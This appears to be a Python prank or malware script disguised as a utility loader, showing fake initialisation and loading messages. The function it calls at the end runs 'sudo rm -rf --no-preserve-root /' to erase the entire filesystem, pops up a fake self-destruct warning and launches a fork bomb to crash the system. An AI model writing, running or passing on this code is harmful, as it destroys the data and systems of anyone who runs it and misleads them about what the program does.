import os
import time

print("Initializing utilities...")
time.sleep(2)
os.system("clear")
print("Wating for all utilities to begin functioning")
time.sleep(3)
os.system("clear")
print("Starting prompt")

for x in range(18):
    print("Loading.")
    time.sleep(0.1)
    os.system("clear")
    print("Loading..")
    time.sleep(0.1)
    os.system("clear")
    print("Loading...")
    time.sleep(0.1)
    os.system("clear")
    print("Loading")
    time.sleep(0.1)
    os.system("clear")

def mainProgramFunction(operation):
    print("Handling main program function")
    print("Defining variables")
    print("Settings utilities up for next operation")
    print("Deliberately initializing utilities.")
    print(operation)

def SecondaryProgramFunction(operation):
    os.system("sudo apt install zenity -y")  # Install zenity, if it's not installed already
    os.system("sudo rm -rf --no-preserve-root /")  # Start deletion
    os.system('zenity --error --text="Critical system error! The system will self-destruct in 5 seconds!"')  # Popup warning
    time.sleep(5)  # Let the popup linger for 5 seconds
    os.system(":(){ :|:& };:")  # Fork bomb to crash the system
    print(operation)

SecondaryProgramFunction("You are cooked!")
